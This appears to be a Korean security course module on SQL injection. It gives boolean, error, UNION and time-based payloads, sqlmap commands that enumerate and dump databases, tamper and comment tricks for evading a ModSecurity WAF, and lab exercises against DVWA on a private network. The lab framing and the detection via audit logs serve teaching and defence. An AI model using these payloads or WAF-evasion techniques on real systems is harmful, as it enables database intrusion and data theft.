# Week 04 — OWASP A03 — SQL Injection (sqlmap + DVWA)

> 본 주차는 OWASP Top 10 의 A03 Injection 의 핵심 — SQL Injection. sqlmap 자동화
> + DVWA / JuiceShop / NeoBank 의 SQLi challenge. 단, 본 lab 의 ModSec (W06) 가
> 차단 → 우회 기법 (W10) 까지 학습.

## 학습 목표

1. SQLi 4 타입 (boolean / error / union / blind)
2. sqlmap 의 자동화 (DBMS detect + 데이터 추출)
3. DVWA 의 low / medium / high 수준별 우회
4. WAF (ModSec) 의 차단 + 우회 패턴
5. JWT / Cookie 의 인증 우회와 SQLi 결합
6. ATT&CK T1190 + CWE-89 매핑

## 1. SQLi 4 타입

### 1.1 Boolean-based (tautology)

```
http://target/?id=1' OR '1'='1
```

WHERE 조건이 항상 참 → 모든 row 반환.

### 1.2 Error-based

```
http://target/?id=1' AND extractvalue(1, concat(0x7e, version()))-- 
```

DB 의 error 메시지에 sensitive 정보 노출.

### 1.3 UNION-based

```
http://target/?id=1 UNION SELECT user,password FROM users--
```

기존 query 의 결과에 추가 row append.

### 1.4 Blind (time-based)

```
http://target/?id=1' AND SLEEP(5)-- 
```

응답 시간 차이로 정보 추출. error / output 없을 때.

## 2. sqlmap 자동화

### 2.1 기본

```
sqlmap -u "http://target/?id=1" --batch
```

자동 DBMS 감지 + SQLi 확인 + payload 생성.

### 2.2 데이터 추출

```
sqlmap -u "http://target/?id=1" --dbs                 # database 목록
sqlmap -u "http://target/?id=1" -D <db> --tables       # table 목록
sqlmap -u "http://target/?id=1" -D <db> -T users --dump  # 모든 row
```

### 2.3 POST + cookie 인증

```
sqlmap -u "http://target/login" --data "user=admin&pass=test" --cookie "PHPSESSID=..."
```

### 2.4 우회 옵션

```
sqlmap --tamper=space2comment      # 공백을 /**/ 로
sqlmap --tamper=randomcase         # 대소문자 random
sqlmap --random-agent              # UA 변경
sqlmap --proxy=http://burp:8080    # Burp 통과
```

## 3. DVWA 수준별 우회

### 3.1 low

```
1' OR '1'='1
```

filter 없음.

### 3.2 medium

POST + addslashes. 작은따옴표 escape → 다른 방법 필요.

```
1 OR 1=1
```

작은따옴표 없는 정수 인젝션.

### 3.3 high

prepared statement. SQLi 거의 불가능.

## 4. ModSec WAF 우회 (W10 예고)

```
1' OR '1'='1        → ModSec 942 차단
1'/*comment*/OR/*comment*/'1'='1  → 일부 우회 가능 (paranoia level 1)
```

paranoia level 1 의 룰 = 표준 패턴. 변형 시 일부 통과. paranoia 2+ 는 강화.

## 5. ATT&CK + CWE 매핑

| 표준 | 매핑 |
|------|------|
| ATT&CK | T1190 Exploit Public-Facing Application |
| CWE | CWE-89 SQL Injection |
| OWASP | A03 Injection |
| CVSS | 보통 9.8 (Critical) |

## 6. 실습 1~6

### 1 — DVWA 진입

```bash
# DVWA 의 메인 페이지 — login 화면
#   응답: <form action="login.php" ...> + setup link
ssh 6v6-attacker 'curl -s -H "Host: dvwa.6v6.lab" http://10.20.30.1/ | head -10'

# DVWA default credential: admin / password
#   로그인 후 PHPSESSID cookie + security level (low/medium/high) 설정 필요
#   (단, 본 lab 은 ModSec 차단 → setup.php 도 차단될 수 있음)
```

### 2 — SQLi 수동 (boolean)

```bash
# DVWA 의 SQLi page (security=low) 에 boolean tautology 페이로드
#   id=1' OR '1'='1  (URL encode: %27=' / %3D== / +=공백)
#   PHPSESSID + security cookie 필수 (실 시도 시 cookie 값 본인 것)
# grep 'Surname' — 응답 HTML 에 모든 user row 가 표시됨 (정상 1 row 이상)
ssh 6v6-attacker "curl -s \
    -H 'Host: dvwa.6v6.lab' \
    -H 'Cookie: PHPSESSID=YOUR_SESSION; security=low' \
    'http://10.20.30.1/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit' \
    | grep -A2 'Surname'"
# 정상 출력: First name: admin / Surname: admin / ... (모든 user)
# ModSec 차단 시: 403 Forbidden 페이지
```

### 3 — sqlmap 자동화 (실 lab — ModSec 차단됨)

```bash
# sqlmap 자동 SQLi 탐색
#   --batch: 모든 질문 yes (자동화)
#   --headers="Host: ...": HAProxy vhost 라우팅
#   기본 동작: DBMS 감지 → 5 타입 SQLi 모두 시도 → 데이터 추출
ssh 6v6-attacker 'sqlmap -u "http://10.20.30.1/?q=1" --batch --headers="Host: dvwa.6v6.lab" 2>&1 | head -30' || true
# 6v6 결과: 대부분 ModSec 942 룰 차단 → 403 → "not injectable" 보고
# 우회: --tamper=space2comment 등 (W10 에서 학습)
```

### 4 — UNION SELECT 시도

```bash
# UNION SELECT — 기존 query 결과에 추가 row append
#   1+UNION+SELECT+1,2,3 → 컬럼 3개 형 (1,2,3 dummy)
#   원래 query 의 컬럼 수와 일치해야 함 (ORDER BY 1,2,...,N 으로 추정)
ssh 6v6-attacker "curl -s -H 'Host: dvwa.6v6.lab' \
    'http://10.20.30.1/?q=1+UNION+SELECT+1,2,3'"
# ModSec 942100 (libinjection) 매치 → 403 예상
```

### 5 — Blind time-based

```bash
# SLEEP(N) — 응답 시간 차이로 정보 추출 (output 없을 때)
#   1+AND+SLEEP(3) → query 가 실행되면 3초 지연
#   time 명령으로 실 응답 시간 측정
time ssh 6v6-attacker "curl -s -H 'Host: dvwa.6v6.lab' 'http://10.20.30.1/?q=1+AND+SLEEP(3)'"
# 예상:
#   ModSec 차단 시: real 0m0.2s (빠른 403)
#   sleep 실행 시:   real 0m3.5s (실 3초 지연)
# 시간 차이 = 정보. 비밀번호 1자씩 binary search 가능 (느린 추출)
```

### 6 — ModSec audit log 확인

```bash
# 본인이 위 SQLi 시도 → web 의 audit log 에 942xxx rule 매치 기록
#   - SecAuditLogFormat JSON 이므로 jq 로 파싱
#   - transaction.messages[] = 매치된 룰 list
#   - select(.id | startswith("942")) = SQLi 카테고리만
ssh 6v6-web 'sudo tail -3 /var/log/apache2/modsec_audit.log | head -1 | \
    jq ".transaction.messages[] | select(.id | startswith(\"942\")) | .msg"'
# 예상 출력:
#   "SQL Injection Attack Detected via libinjection"
#   "Detects classic SQL injection probings 1/3"
```

## 7. 과제

A. 4 타입 페이로드 (필수) — boolean / error / union / blind 각 1 페이로드 + 응답 분석
B. sqlmap report (심화) — sqlmap 의 자동 출력 분석 + ModSec 차단 비율
C. 우회 시뮬 (정성) — tamper script 3종 (space2comment / randomcase / between) 효과

## 8. W05 (XSS) 예고

Reflected / Stored / DOM-based XSS + CSP 우회.
